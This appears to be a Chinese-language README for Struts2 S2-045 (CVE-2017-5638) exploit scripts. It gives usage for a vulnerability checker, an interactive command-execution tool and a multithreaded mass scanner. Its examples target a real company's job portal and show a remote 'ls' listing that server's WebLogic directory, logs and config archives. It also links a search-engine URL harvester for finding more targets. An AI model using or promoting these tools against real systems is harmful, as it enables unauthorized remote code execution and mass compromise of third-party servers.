### USage

#### 检测漏洞POC
python s2_045.py http://job.10086.cn/company/anouncement/showAnouncement.action

```bash
>python s2_045_cmd.py http://job.10086.cn/company/anouncement/showAnouncement.action
[Loopholes exist] http://job.10086.cn/company/anouncement/showAnouncement.action
```
#### 漏洞利用POC（cmd版）
python s2_045_cmd.py http://job.10086.cn/company/anouncement/showAnouncement.action

```bash
>python s2_045_cmd.py http://job.10086.cn/company/anouncement/showAnouncement.action
[Loopholes exist] http://job.10086.cn/company/anouncement/showAnouncement.action
[cmd]>>ls
autodeploy
bin
career2.log
career2.log.2017-02-01
career2.log.2017-02-02
career2.log.2017-02-03
career2.log.2017-02-04
career2.log.2017-02-05
career2.log.2017-02-06
career2.log.2017-02-07
career2.log.2017-02-08
career2.log.2017-02-09
career2.log.2017-02-10
career2.log.2017-02-11
career2.log.2017-02-12
career2.log.2017-02-13
career2.log.2017-02-14
career2.log.2017-02-15
career2.log.2017-02-16
career2.log.2017-02-17
career2.log.2017-02-18
career2.log.2017-02-19
career2.log.2017-02-20
career2.log.2017-02-21
career2.log.2017-02-22
career2.log.2017-02-23
career2.log.2017-02-24
career2.log.2017-02-25
career2.log.2017-02-26
career2.log.2017-02-27
career2.log.2017-02-28
career2.log.2017-03-01
career2.log.2017-03-02
career2.log.2017-03-03
career2.log.2017-03-04
career2.log.2017-03-05
career2.log.2017-03-06
config
config20150826.tar.gz
config20151204.tar.gz
console-ext
edit.lok
fileRealm.properties
init-info
lib
pending
security
servers
shutdown.py
startManagedWebLogic_readme.txt
startWebLogic.sh
tmp

```
#### 多线程批量检测脚本
python S2_045_thread.py（填写url.txt后运行）

```bash
填写url.txt文件，每行一个url地址(url中含.action/.do的地址)，运行完以后会生成一个result.txt文件存放存在漏洞的url
```

#### 利用搜索引擎批量检测脚本
想要采集网站中带.action/.do地址的，请看：[Search_S2_045](https://github.com/tengzhangchao/Struts2_045-Poc/tree/master/Search_S2_045)


更多请参考博客：[nMask](http://thief.one/2017/03/07/Struts2-045%E6%BC%8F%E6%B4%9E/)